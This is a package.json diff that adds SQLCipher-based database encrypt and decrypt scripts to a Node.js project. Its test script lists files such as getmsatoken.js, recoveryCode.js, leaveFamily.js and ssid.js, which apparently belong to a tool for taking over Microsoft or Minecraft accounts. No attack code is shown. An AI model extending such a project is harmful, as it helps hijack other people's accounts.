@@ -10,6 +10,8 @@
     "pm2:restart": "node scripts/pm2-runner.js restart all",
     "pm2:status": "node scripts/pm2-runner.js status",
     "pm2:logs": "node scripts/pm2-runner.js logs",
+    "db:encrypt": "node scripts/encryptDatabase.js",
+    "db:decrypt": "node scripts/decryptDatabase.js",
     "ui:dev": "npm --prefix frontend run dev",
     "ui:build": "npm --prefix frontend run build",
     "test": "node -c server.js run_all.js configLoader.js autosecure/utils/family/getPuid.js autosecure/utils/family/leaveFamily.js autosecure/utils/minecraft/profile.js autosecure/utils/minecraft/ssid.js autosecure/utils/minecraft/xbl.js autosecure/utils/minecraft/newxbl.js autosecure/utils/sections/aliasses.js autosecure/utils/secure/recodesecure.js autosecure/utils/secure/recoveryCode.js autosecure/utils/secure/recoveryCodefix.js autosecure/utils/secure/getmsatoken.js autosecure/utils/secure/securityInformation.js autosecure/utils/process/helpers.js autosecure/utils/process/globalAxiosProxy.js"
@@ -62,6 +64,7 @@
     "socks": "^2.8.3",
     "socks-proxy-agent": "^8.0.3",
     "sqlite3": "^5.1.7",
+    "@journeyapps/sqlcipher": "^5.3.1",
     "tiny-secp256k1": "^2.2.3",
     "uuid": "^11.1.0"
   },
